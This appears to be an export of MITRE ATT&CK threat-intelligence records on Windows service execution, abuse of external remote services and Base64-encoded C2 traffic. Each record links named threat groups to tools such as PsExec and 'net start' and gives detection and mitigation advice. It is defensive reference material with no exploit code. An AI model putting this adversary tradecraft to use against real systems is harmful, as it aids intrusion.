609,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
610,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
611,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
612,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['Naikon'],['Naikon'],['G0019'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
613,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
614,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
615,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['[[Software/S0154|Cobalt Strike]] can use [[Software/S0029|PsExec]] to execute a payload on a remote host.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: Cobalt Strike,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
616,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['FIN6'],['FIN6'],['G0037'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
617,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
618,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['Microsoft Sysinternals [[Software/S0029|PsExec]] is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.[[CiteRef::Russinovich Sysinternals]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: PsExec,['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
619,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
620,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']",['The <code>net start</code> and <code>net stop</code> commands can be used in [[Software/S0039|Net]] to execute or stop Windows services.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: Net, net.exe",['Execution'],['Technique/T1035'],['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
621,"['Follow best practices for detecting adversary use of [[Technique/T1078|Valid Accounts]] for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.']",[],[],['Daniel Oakley'],['Authentication logs'],['[[Group/G0026|APT18]] actors leverage legitimate credentials to log into external remote services.[[CiteRef::RSA2017 Detect and Respond Adair]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"[""Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. Deny direct remote access to internal systems through uses of network proxies, gateways, and firewalls as appropriate. Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of [[Technique/T1111|Two-Factor Authentication Interception]] techniques for some two-factor authentication implementations.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Persistence'],['Technique/T1133'],['External Remote Services'],https://attack.mitre.org/wiki/Technique/T1133
622,"['Follow best practices for detecting adversary use of [[Technique/T1078|Valid Accounts]] for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.']",[],[],['Daniel Oakley'],['Authentication logs'],['[[Group/G0027|Threat Group-3390]] actors look for and use VPN profiles during an operation to access the network using external VPN services.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"[""Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. Deny direct remote access to internal systems through uses of network proxies, gateways, and firewalls as appropriate. Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of [[Technique/T1111|Two-Factor Authentication Interception]] techniques for some two-factor authentication implementations.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Persistence'],['Technique/T1133'],['External Remote Services'],https://attack.mitre.org/wiki/Technique/T1133
623,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['Responses from the [[Software/S0124|Pisloader]] C2 server are base32-encoded.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Pisloader,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
624,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0129|AutoIt]] has sent a C2 response that was base64-encoded.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: AutoIt,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
625,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0128|BADNEWS]] encodes C2 traffic with base64.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: BADNEWS,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
626,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']","['C2 traffic from [[Software/S0045|ADVSTORESHELL]] is encrypted, then encoded with Base64 encoding.[[CiteRef::Kaspersky Sofacy]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ADVSTORESHELL, NETUI, ...",['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
627,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0137|CORESHELL]] C2 messages are Base64-encoded.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CORESHELL, SOURFACE",['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
628,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0081|Elise]] exfiltrates data using cookie values that are Base64-encoded.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Elise, BKDR_ESILE, Page",['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
629,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0083|Misdat]] network traffic is Base64-encoded plaintext.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Misdat,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
